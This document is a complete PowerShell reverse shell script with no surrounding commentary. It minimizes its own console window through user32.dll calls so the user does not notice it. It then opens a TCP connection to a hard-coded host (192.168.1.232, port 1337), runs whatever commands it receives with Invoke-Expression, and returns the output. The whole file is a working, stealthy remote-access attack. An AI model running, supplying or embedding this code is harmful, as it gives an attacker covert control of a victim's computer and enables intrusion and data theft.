# Define the parameters
param(
    [string]$I = "192.168.1.232",
    [int]$P = 1337
)

# Add C# code for minimizing the Command Prompt window
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class CmdMinimizer {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@

# Find the PowerShell window and minimize it
$hWnd = [CmdMinimizer]::FindWindow([NullString]::Value, [NullString]::Value)
$result = [CmdMinimizer]::ShowWindow($hWnd, 6)

# Your existing code
try {
    $client = New-Object System.Net.Sockets.TCPClient($I, $P);
    $stream = $client.GetStream();
    $writer = New-Object System.IO.StreamWriter($stream);
    $writer.AutoFlush = $True;
    $buffer = New-Object 'byte[]' 1024;
    $encoding = New-Object System.Text.AsciiEncoding;

    while($true) {
        $read = $stream.Read($buffer, 0, 1024)
        $command = $encoding.GetString($buffer, 0, $read).Trim()
        if (![string]::IsNullOrWhiteSpace($command)) {
            $response = Invoke-Expression $command 2>&1 | Out-String
            $writer.WriteLine($response)
            $writer.Flush()
        }
    }
} catch {
    Write-Host "An error occurred: $_"
} finally {
    $writer.Close()
    $stream.Close()
    $client.Close()
}
